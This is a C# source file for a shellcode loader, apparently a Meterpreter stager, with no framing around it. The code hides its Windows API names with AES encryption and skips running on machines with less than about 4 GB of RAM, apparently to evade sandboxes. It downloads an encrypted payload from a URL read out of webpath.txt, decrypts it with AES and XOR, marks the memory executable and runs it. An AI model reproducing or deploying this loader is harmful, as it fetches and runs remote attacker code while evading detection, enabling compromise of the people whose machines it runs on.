using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace TCPMeterpreterProcess
{
    class Program
    {
        internal static class Unsafe
        {

            [DllImport("Kernel32")]
            internal static extern IntPtr GetProcAddress(IntPtr hModule, string procname);
            [DllImport("Kernel32")]
            internal static extern IntPtr LoadLibrary(string moduleName);
        }
        internal delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        static void Main(string[] args)
        {
            run_2();
        }
        private static void run_2()
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
            double totalMemoryMb = 0;
            string k = "AyD9Y9zW9dtvfqJzJb33gA==";
            string key = "BsijVUv2v+Ql/NM3pQv8uQ==";
            IntPtr K_handler = Unsafe.LoadLibrary(AesDecrypt(k, key));
            IntPtr trvp = Unsafe.GetProcAddress(K_handler, AesDecrypt("3T4eooJx0SrVxuzFC9jxuA==", key));
            foreach (ManagementObject obj in searcher.Get())
            {
                ulong totalMemoryBytes = (ulong)obj["TotalPhysicalMemory"];
                totalMemoryMb = (totalMemoryBytes / 1024f) / 1024f;
            }
            if (totalMemoryMb >= 3999)
            {
                byte[] shellcode = GetShellCode();
                UInt32 PAGE_EXECUTE_READWRITE = 0x40;
                UInt32 oldProtect;
                IntPtr mem = Marshal.AllocHGlobal(shellcode.Length);
                Marshal.Copy(shellcode, 0, mem, shellcode.Length);
                VirtualProtect vp = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(trvp, typeof(VirtualProtect));
                
                vp(mem, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
                var shellcodeDelegate = (Action)Marshal.GetDelegateForFunctionPointer(mem, typeof(Action));
                shellcodeDelegate();
            }
        }
        private static byte[] GetShellCode()
        {
            string path = System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase + "webpath.txt";
            string webpath = File.ReadAllText(path, Encoding.UTF8);
            WebRequest request = WebRequest.Create(webpath);
            WebResponse response = request.GetResponse();
            Stream s = response.GetResponseStream();
            StreamReader sr = new StreamReader(s, Encoding.GetEncoding("UTF-8"));
            string result = sr.ReadToEnd();
            result = AesDecrypt(result, "BsijVUv2v+Ql/NM3pQv8uQ==");
            char[] c_result = result.ToCharArray();
            result = new string(Xor_Decrypt(c_result));
            byte[] shellcode = HexStringToBytes(result);
            return shellcode;
        }
        private static char[] Xor_Decrypt(char[] data)
        {
            char[] key = "qwertyuiopasdfghjklzxcvbnm".ToArray();
            char[] encryptedData = new char[data.Length];
            for(int i = 0; i < data.Length; i++)
            {
                encryptedData[i] = (char)(data[i] ^ key[i % key.Length]); 
            }
            return encryptedData;
        }
        private static string AesDecrypt(string str, string key)
        {
            if (string.IsNullOrEmpty(str)) return null;
            Byte[] toEncryptArray = Convert.FromBase64String(str);
            RijndaelManaged rm = new RijndaelManaged
            {
                Key = Encoding.UTF8.GetBytes(key),
                Mode = CipherMode.ECB,
                Padding = PaddingMode.PKCS7
            };
            ICryptoTransform cTransform = rm.CreateDecryptor();
            Byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
            return Encoding.UTF8.GetString(resultArray);
        }
        public static byte[] HexStringToBytes(string hexString)
        {
            hexString = hexString.Replace(" ", "").Replace("0x", "").Replace("0X", "").Replace("-", "").Replace(":", "").Replace(",", "").Replace("\\x","").Replace("\\X","");
            if (hexString.Length % 2 != 0)
                throw new ArgumentException();
            return Enumerable.Range(0, hexString.Length / 2)
                    .Select(i => Convert.ToByte(hexString.Substring(i * 2, 2), 16))
                    .ToArray();
        }
    }
}